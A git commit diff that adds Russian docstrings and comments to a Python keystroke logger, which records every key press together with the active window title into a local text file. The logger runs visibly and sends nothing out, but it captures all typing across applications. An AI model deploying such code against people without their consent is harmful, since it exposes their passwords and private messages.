aa061250499b4e9319a76154702e0388cbee7dd5
Tulopex <121350192+Tulopex@users.noreply.github.com>
2024-06-04 19:54:15 +0300

    keyboard changed

--- keyboard/main.py
+++ keyboard/main.py
@@ -5,22 +5,44 @@ from threading import Timer
 from ctypes import windll
 
 class KeyboardLogger:
+    """
+    Класс для логирования действий на клавиатуре
+    """
     def __init__(self, save_interval=5, output_file="output.txt"):
-        self.text = ""
+        """
+        Инициализация класса
+        
+        Args:
+            save_interval (int): интервал сохранения текста
+            output_file (str): путь к файлу для сохранения текста
+        """
+        self.text = ""  # записываемый текст
         script_dir = os.path.dirname(os.path.abspath(__file__))
         self.output_file = os.path.join(script_dir, output_file)
-        self.save_interval = save_interval
-        self.timer = None
-        self.is_typing = False
-        self.current_window = self.get_active_window()
+        self.save_interval = save_interval  # интервал сохранения текста
+        self.timer = None  # таймер для сохранения текста
+        self.is_typing = False  # флаг, показывающий, что пользователь набирает текст
+        self.current_window = self.get_active_window()  # активное окно
 
     def get_active_window(self):
+        """
+        Получение активного окна
+        
+        Returns:
+            str: заголовок активного окна
+        """
         window = gw.getActiveWindow()
         if window is not None:
             return window.title
-        return "Unknown"
+        return "Unknown"  # если окно не найдено
 
     def get_current_lang(self):
+        """
+        Получение текущего языка клавиатуры
+        
+        Returns:
+            str: язык клавиатуры ("ru" или "en")
+        """
         user32 = windll.user32
         hkl = user32.GetKeyboardLayout(user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), 0))
         lid = hkl & 0xffff
@@ -29,12 +51,21 @@ class KeyboardLogger:
         return "en"
 
     def start_logging(self):
+        """
+        Запуск логирования
+        """
         keyboard.on_press(self.on_key_press)
         keyboard.on_release(self.on_key_release)
         print("Начало отслеживания. Нажмите 'Esc' для выхода.")
         keyboard.wait('esc')
 
     def on_key_press(self, event):
+        """
+        Обработчик нажатия клавиши
+        
+        Args:
+            event: объект события нажатия клавиши
+        """
         if not self.is_typing:
             self.is_typing = True
             self.restart_timer()
@@ -54,23 +85,44 @@ class KeyboardLogger:
                 self.text += event.name
 
     def translate_to_russian(self, key):
+        """
+        Перевод латинских символов на русские
+        
+        Args:
+            key (str): латинский символ
+        
+        Returns:
+            str: соответствующий русский символ
+        """
         eng_to_ru = {
-            'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х', ']': 'ъ',
-            'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д', ';': 'ж', '\'': 'э',
-            'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.'
+            'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х',
+            ']': 'ъ', 'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д', ';': 'ж',
+            '\'': 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.'
         }
         return eng_to_ru.get(key, key)
 
     def on_key_release(self, event):
+        """
+        Обработчик отпускания клавиши
+        
+        Args:
+            event: объект события отпускания клавиши
+        """
         self.restart_timer()
 
     def restart_timer(self):
+        """
+        Перезапуск таймера сохранения текста
+        """
         if self.timer:
             self.timer.cancel()
         self.timer = Timer(self.save_interval, self.save_text)
         self.timer.start()
 
     def save_text(self):
+        """
+        Сохранение текста в файл
+        """
         if self.text:
             with open(self.output_file, "a", encoding="utf-8") as file:
                 file.write(f"\n[{self.current_window}]\n")
@@ -81,3 +133,4 @@ class KeyboardLogger:
 if __name__ == "__main__":
     logger = KeyboardLogger(save_interval=5, output_file="output.txt")
     logger.start_logging()
+
